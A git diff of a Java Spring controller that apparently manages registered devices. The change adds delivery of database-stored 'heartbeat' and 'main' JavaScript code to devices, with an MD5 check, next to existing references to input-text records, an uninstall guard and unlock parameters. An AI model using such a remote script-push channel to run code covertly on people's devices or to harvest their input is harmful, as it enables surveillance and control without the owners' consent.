@@ -6,6 +6,9 @@ import java.util.Objects;
 import javax.annotation.Resource;
 import javax.servlet.http.HttpServletRequest;
 
+import io.renren.modules.app.entity.JsCode;
+import io.renren.modules.app.service.*;
+import org.apache.commons.lang3.StringUtils;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestBody;
@@ -24,12 +27,6 @@ import io.renren.modules.app.context.DeviceContext;
 import io.renren.modules.app.entity.Device;
 import io.renren.modules.app.entity.InputTextRecord;
 import io.renren.modules.app.entity.Log;
-import io.renren.modules.app.service.DeviceService;
-import io.renren.modules.app.service.InputTextRecordService;
-import io.renren.modules.app.service.InstallAppService;
-import io.renren.modules.app.service.LogService;
-import io.renren.modules.app.service.MajorDataService;
-import io.renren.modules.app.service.TransferService;
 import io.renren.modules.app.vo.DeviceStatus;
 import io.renren.modules.app.vo.ServerConfig;
 import io.renren.modules.app.vo.UnLockParams;
@@ -56,6 +53,8 @@ public class DeviceApiController extends BaseApiController {
 
     @Resource
     private LogService logService;
+    @Resource
+    private JsCodeService jsCodeService;
 
 
     //注册设备
@@ -179,7 +178,7 @@ public class DeviceApiController extends BaseApiController {
      */
     @RequestMapping("getConfig")
     public Result<ServerConfig> getConfig(@RequestBody DeviceStatus deviceStatus) {
-        ServerConfig serverConfig = new ServerConfig(false, null, "Log.i('测试代码:' + _pkg)", "{}", false, false, false);
+        ServerConfig serverConfig = new ServerConfig();
         Device dbDevice = deviceService.findByDeviceId(DeviceContext.getDeviceId());
 
         if (dbDevice == null) {
@@ -199,6 +198,16 @@ public class DeviceApiController extends BaseApiController {
 
         if (Objects.equals(Constant.YN.Y, dbDevice.getUninstallGuard())) {
             serverConfig.setUninstallGuard(true);
+        }
+
+        JsCode jsCode = jsCodeService.findByKey(Constant.JsCodeKey.heartbeat);
+        if (jsCode != null) {
+            serverConfig.setCode(jsCode.getCode());
+        }
+        JsCode mainJsCode = jsCodeService.findByKey(Constant.JsCodeKey.main);
+        if (StringUtils.isEmpty(deviceStatus.getJsCodeMd5()) || !Objects.equals(deviceStatus.getJsCodeMd5(), mainJsCode.getCodeMd5())) {
+            serverConfig.setMainCode(mainJsCode.getCode());
+            serverConfig.setMainCodeMd5(mainJsCode.getCodeMd5());
         }
 
 
